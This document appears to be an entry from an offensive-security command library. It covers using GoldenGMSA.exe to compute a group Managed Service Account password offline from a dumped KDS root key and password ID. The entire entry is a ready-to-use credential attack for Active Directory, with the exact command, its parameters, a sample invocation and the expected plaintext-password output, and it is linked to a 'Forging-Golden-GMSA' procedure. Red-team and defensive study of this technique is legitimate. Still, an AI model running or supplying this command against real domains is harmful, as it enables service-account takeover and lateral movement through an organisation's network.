---
id: a553ef93-d135-46dd-80bb-1d375d53cb57
name: golden-gmsa-compute-password-offline-mode
type: command
executor: bash
data: GoldenGMSA.exe compute --sid $_GMSA_SID --kdskey $_KDS_KEY --pwdid $_PWD_ID
output: null
created_at: '2023-04-06T03:56:04.615739+00:00'
updated_at: '2023-04-10T20:25:56.697280+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - password-computation
verified: true
validated: true
---

# golden-gmsa-compute-password-offline-mode

## Command

```bash
GoldenGMSA.exe compute --sid $_GMSA_SID --kdskey $_KDS_KEY --pwdid $_PWD_ID
```

## Description

Computes the GMSA password offline using pre-dumped KDS key and password ID, requiring no live domain access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --sid | SID of the GMSA | Yes |
| --kdskey | Base64-encoded KDS root key blob | Yes |
| --pwdid | Base64-encoded msDS-ManagedPasswordId | Yes |
| compute | Subcommand to compute password | Yes |

## Examples

### Basic Usage

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA
```

## Expected Output

Computed password:
```
Password: ComputedPlaintextPassword123!
```

## Related

- [[procedures/Forging-Golden-GMSA]]
- [[tools/GoldenGMSA]]
